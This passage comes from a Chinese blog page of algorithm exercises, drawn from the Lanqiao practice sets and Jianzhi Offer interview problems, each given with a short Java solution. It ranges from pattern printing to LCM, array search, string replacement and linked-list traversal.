class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　编写一个程序，首先输入一个整数，例如5，然后在屏幕上显示如下的图形（5表示行数）：</span><br><span class="line">　　* * * * *</span><br><span class="line">　　* * * *</span><br><span class="line">　　* * *</span><br><span class="line">　　* *</span><br><span class="line">　　*</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> row = in.nextInt();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= row;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; row-i+<span class="number">1</span>;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">"* "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-156-表达式计算"><a href="#ALGO-156-表达式计算" class="headerlink" title="ALGO-156 表达式计算"></a>ALGO-156 表达式计算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　输入一个只包含加减乖除和括号的合法表达式，求表达式的值。其中除表示整除。</span><br><span class="line">输入格式</span><br><span class="line">　　输入一行，包含一个表达式。</span><br><span class="line">输出格式</span><br><span class="line">　　输出这个表达式的值。</span><br><span class="line">样例输入</span><br><span class="line">1-2+3*(4-5)</span><br><span class="line">样例输出</span><br><span class="line">-4</span><br><span class="line">数据规模和约定</span><br><span class="line">　　表达式长度不超过100，表达式运算合法且运算过程都在int内进行。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="历届试题"><a href="#历届试题" class="headerlink" title="历届试题"></a>历届试题</h2><h3 id="PREV-1-核桃的数量"><a href="#PREV-1-核桃的数量" class="headerlink" title="PREV-1  核桃的数量"></a>PREV-1  核桃的数量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">小张是软件项目经理，他带领3个开发组。工期紧，今天都在加班呢。为鼓舞士气，小张打算给每个组发一袋核桃（据传言能补脑）。他的要求是：</span><br><span class="line"></span><br><span class="line">1. 各组的核桃数量必须相同</span><br><span class="line"></span><br><span class="line">2. 各组内必须能平分核桃（当然是不能打碎的）</span><br><span class="line"></span><br><span class="line">3. 尽量提供满足1,2条件的最小数量（节约闹革命嘛）</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入包含三个正整数a, b, c，表示每个组正在加班的人数，用空格分开（a,b,c&lt;30）</span><br><span class="line">输出格式</span><br><span class="line">输出一个正整数，表示每袋核桃的数量。</span><br><span class="line">样例输入1</span><br><span class="line">2 4 5</span><br><span class="line">样例输出1</span><br><span class="line">20</span><br><span class="line">样例输入2</span><br><span class="line">3 1 1</span><br><span class="line">样例输出2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> a = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> b = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> c = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%a == <span class="number">0</span> &amp;&amp; i%b == <span class="number">0</span> &amp;&amp; i%c == <span class="number">0</span>)&#123;</span><br><span class="line">                result=i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PREV-2-打印十字图"><a href="#PREV-2-打印十字图" class="headerlink" title="PREV-2  打印十字图"></a>PREV-2  打印十字图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">小明为某机构设计了一个十字型的徽标（并非红十字会啊），如下所示：</span><br><span class="line"></span><br><span class="line">..$$$$$$$$$$$$$..</span><br><span class="line">..$...........$..</span><br><span class="line">$$$.$$$$$$$$$.$$$</span><br><span class="line">$...$.......$...$</span><br><span class="line">$.$$$.$$$$$.$$$.$</span><br><span class="line">$.$...$...$...$.$</span><br><span class="line">$.$.$$$.$.$$$.$.$</span><br><span class="line">$.$.$...$...$.$.$</span><br><span class="line">$.$.$.$$$$$.$.$.$</span><br><span class="line">$.$.$...$...$.$.$</span><br><span class="line">$.$.$$$.$.$$$.$.$</span><br><span class="line">$.$...$...$...$.$</span><br><span class="line">$.$$$.$$$$$.$$$.$</span><br><span class="line">$...$.......$...$</span><br><span class="line">$$$.$$$$$$$$$.$$$</span><br><span class="line">..$...........$..</span><br><span class="line">..$$$$$$$$$$$$$..</span><br><span class="line">对方同时也需要在电脑dos窗口中以字符的形式输出该标志，并能任意控制层数。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">一个正整数 n (n&lt;30) 表示要求打印图形的层数。</span><br><span class="line">输出格式</span><br><span class="line">对应包围层数的该标志。</span><br><span class="line">样例输入1</span><br><span class="line">1</span><br><span class="line">样例输出1</span><br><span class="line">..$$$$$..</span><br><span class="line">..$...$..</span><br><span class="line">$$$.$.$$$</span><br><span class="line">$...$...$</span><br><span class="line">$.$$$$$.$</span><br><span class="line">$...$...$</span><br><span class="line">$$$.$.$$$</span><br><span class="line">..$...$..</span><br><span class="line">..$$$$$..</span><br><span class="line">样例输入2</span><br><span class="line">3</span><br><span class="line">样例输出2</span><br><span class="line">..$$$$$$$$$$$$$..</span><br><span class="line">..$...........$..</span><br><span class="line">$$$.$$$$$$$$$.$$$</span><br><span class="line">$...$.......$...$</span><br><span class="line">$.$$$.$$$$$.$$$.$</span><br><span class="line">$.$...$...$...$.$</span><br><span class="line">$.$.$$$.$.$$$.$.$</span><br><span class="line">$.$.$...$...$.$.$</span><br><span class="line">$.$.$.$$$$$.$.$.$</span><br><span class="line">$.$.$...$...$.$.$</span><br><span class="line">$.$.$$$.$.$$$.$.$</span><br><span class="line">$.$...$...$...$.$</span><br><span class="line">$.$$$.$$$$$.$$$.$</span><br><span class="line">$...$.......$...$</span><br><span class="line">$$$.$$$$$$$$$.$$$</span><br><span class="line">..$...........$..</span><br><span class="line">..$$$$$$$$$$$$$..</span><br><span class="line">提示</span><br><span class="line">请仔细观察样例，尤其要注意句点的数量和输出位置。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> low,row,center;</span><br><span class="line">        low = row = <span class="number">4</span>*(n-<span class="number">1</span>)+<span class="number">9</span>;</span><br><span class="line">        <span class="keyword">int</span> [][]array = <span class="keyword">new</span> <span class="keyword">int</span>[low][row];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; low;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; row;j++)&#123;</span><br><span class="line">                array[i][j] = <span class="string">'.'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        center = row/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = center-<span class="number">2</span>;i &lt;= center+<span class="number">2</span>;i++)&#123;</span><br><span class="line">            array[center][i] = <span class="string">'$'</span>;</span><br><span class="line">            array[i][center] = <span class="string">'$'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>;m &lt; n;m++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = center-<span class="number">2</span>-<span class="number">2</span>*m;i &lt; (center+<span class="number">3</span>+<span class="number">2</span>*m);i++)&#123;</span><br><span class="line">                array[center-(<span class="number">4</span>+m*<span class="number">2</span>)][i] = <span class="string">'$'</span>;</span><br><span class="line">                array[center+(<span class="number">4</span>+m*<span class="number">2</span>)][i] = <span class="string">'$'</span>;</span><br><span class="line">                array[i][center-(<span class="number">4</span>+m*<span class="number">2</span>)] = <span class="string">'$'</span>;</span><br><span class="line">                array[i][center+(<span class="number">4</span>+m*<span class="number">2</span>)] = <span class="string">'$'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>;m &lt; n;m++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = center-<span class="number">3</span>-<span class="number">2</span>*m;i &lt;= center+<span class="number">3</span>+<span class="number">2</span>*m;i++)&#123;</span><br><span class="line">                array[center-(<span class="number">2</span>+<span class="number">2</span>*m)][i] = <span class="string">'$'</span>;</span><br><span class="line">                array[center+(<span class="number">2</span>+<span class="number">2</span>*m)][i] = <span class="string">'$'</span>;</span><br><span class="line">                array[i][center-(<span class="number">2</span>+<span class="number">2</span>*m)] = <span class="string">'$'</span>;</span><br><span class="line">                array[i][center+(<span class="number">2</span>+<span class="number">2</span>*m)] = <span class="string">'$'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array[center-(<span class="number">2</span>+<span class="number">2</span>*m)][center-(<span class="number">1</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center-(<span class="number">2</span>+<span class="number">2</span>*m)][center+(<span class="number">1</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center-(<span class="number">1</span>+<span class="number">2</span>*m)][center-(<span class="number">2</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center-(<span class="number">1</span>+<span class="number">2</span>*m)][center+(<span class="number">2</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center+(<span class="number">1</span>+<span class="number">2</span>*m)][center-(<span class="number">2</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center+(<span class="number">1</span>+<span class="number">2</span>*m)][center+(<span class="number">2</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center+(<span class="number">2</span>+<span class="number">2</span>*m)][center-(<span class="number">1</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">            array[center+(<span class="number">2</span>+<span class="number">2</span>*m)][center+(<span class="number">1</span>+<span class="number">2</span>*m)] = <span class="string">'.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; low;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; row;j++)&#123;</span><br><span class="line">                System.out.print((<span class="keyword">char</span>)array[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PREV-3-带分数"><a href="#PREV-3-带分数" class="headerlink" title="PREV-3  带分数"></a>PREV-3  带分数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">100 可以表示为带分数的形式：100 = 3 + 69258 / 714。</span><br><span class="line"></span><br><span class="line">还可以表示为：100 = 82 + 3546 / 197。</span><br><span class="line"></span><br><span class="line">注意特征：带分数中，数字1~9分别出现且只出现一次（不包含0）。</span><br><span class="line"></span><br><span class="line">类似这样的带分数，100 有 11 种表示法。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">从标准输入读入一个正整数N (N&lt;1000*1000)</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">程序输出该数字用数码1~9不重复不遗漏地组成带分数表示的全部种数。</span><br><span class="line"></span><br><span class="line">注意：不要求输出每个表示，只统计有多少表示法！</span><br><span class="line"></span><br><span class="line">样例输入1</span><br><span class="line">100</span><br><span class="line">样例输出1</span><br><span class="line">11</span><br><span class="line">样例输入2</span><br><span class="line">105</span><br><span class="line">样例输出2</span><br><span class="line">6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="剑指Offer"><a href="#剑指Offer" class="headerlink" title="剑指Offer"></a>剑指Offer</h1><h2 id="二维数组中的查找"><a href="#二维数组中的查找" class="headerlink" title="二维数组中的查找"></a>二维数组中的查找</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</span><br><span class="line">4 4</span><br><span class="line">1 2 8 9</span><br><span class="line">2 4 9 12</span><br><span class="line">4 7 10 13</span><br><span class="line">6 8 11 15</span><br><span class="line">7</span><br><span class="line">true</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> row = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> column = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[row][column];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; row;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; column;j++)&#123;</span><br><span class="line">                arr[i][j] = in.nextInt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> target = in.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> flag = Find(target,arr);</span><br><span class="line">        System.out.println(flag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> target, <span class="keyword">int</span> [][] array)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rows = array.length;</span><br><span class="line">        <span class="keyword">int</span> columns = array[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">boolean</span> found = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rows&gt;<span class="number">0</span> &amp;&amp; columns &gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> row = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> column = columns - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (row &lt; rows &amp;&amp; column &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(array[row][column] == target)&#123;</span><br><span class="line">                    found = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[row][column]&gt;target)&#123;</span><br><span class="line">                    column--;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    row++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> found;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="替换空格"><a href="#替换空格" class="headerlink" title="替换空格"></a>替换空格</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请实现一个函数，将一个字符串中的空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        StringBuffer s1 = <span class="keyword">new</span> StringBuffer(in.next());</span><br><span class="line">        System.out.println(replaceSpace(s1));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">replaceSpace</span><span class="params">(StringBuffer str)</span> </span>&#123;</span><br><span class="line">        String s = str.toString();</span><br><span class="line">        <span class="keyword">return</span> s.replaceAll(<span class="string">" "</span>,<span class="string">"%20"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="从尾到头打印链表"><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a>从尾到头打印链表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入一个链表，从尾到头打印链表每个节点的值。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 法一：</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*    public class ListNode &#123;</span></span><br><span class="line"><span class="comment">*        int val;</span></span><br><span class="line"><span class="comment">*        ListNode next = null;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*        ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">*            this.val = val;</span></span><br><span class="line"><span class="comment">*        &#125;</span></span><br><span class="line"><span class="comment">*    &#125;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">printListFromTailToHead</span><span class="params">(ListNode listNode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(listNode!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.printListFromTailToHead(listNode.next);</span><br><span class="line">            arrayList.add(listNode.val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arrayList;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 法二：</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*    public class ListNode &#123;</span></span><br><span class="line"><span class="comment">*        int val;</span></span><br><span class="line"><span class="comment">*        ListNode next = null;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*        ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">*            this.val = val;</span></span><br><span class="line"><span class="comment">*        &#125;</span></span><br><span class="line"><span class="comment">*    &#125;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">printListFromTailToHead</span><span class="params">(ListNode listNode)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span 